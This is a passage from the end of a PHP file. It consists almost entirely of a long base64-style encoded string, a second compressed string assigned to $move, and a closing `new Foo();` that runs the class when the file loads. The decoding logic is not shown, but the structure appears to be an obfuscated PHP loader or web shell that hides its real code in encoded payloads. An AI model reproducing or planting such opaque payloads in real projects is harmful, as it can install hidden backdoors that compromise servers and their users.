	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";
	 
	var $move = "bZJbT8JAEIXfTfgPw4bQNiEgcjPp5cXUYExEAX0BQ0q7lQ3tbrPdCo3w350iolzeunPOnP12ppX5KvoA
	G8iMQB3SbJ4qqcdBR6/MRu7wzR1OtP54/DzrD0Zj7d2owXUNWoZZumKhztKUKjQO3ZdXdzSeaLP1J3oM
	qCzSBWYepZ2YdkHNrmECjVL6L+xuMHh8cCeVgguzSlf7sBPFBOwp0zhRuV448FZJVSY5eFJ6P7UaaJ43
	b920tAKY+gsBmjUXQQ6C+4IrulYx5ZlN9p2hhyjEsVJfskQ5gfAz1FV9JZmiEddJ+7oNT0LBvch4QAzz
	4BB8SfNArDiChhn3FRNcpwZ8sRB0WveVjB5pDtVqcULrnQgo2LYN3R5sNnBcu+1eqHXOa81m7+/VO3Zz
	a64YRw4E8iPmLy/hlA88v80mnD11qlmhkDF4u16bEIipWojAJolIFc6I8SRToPKE2qQYJAHuxfiN2z1R
	8S+IGeqfXpTh0XFQbxThzhT3srUa+3FbjWI1jmZ+Aw==";
}

new Foo();
?>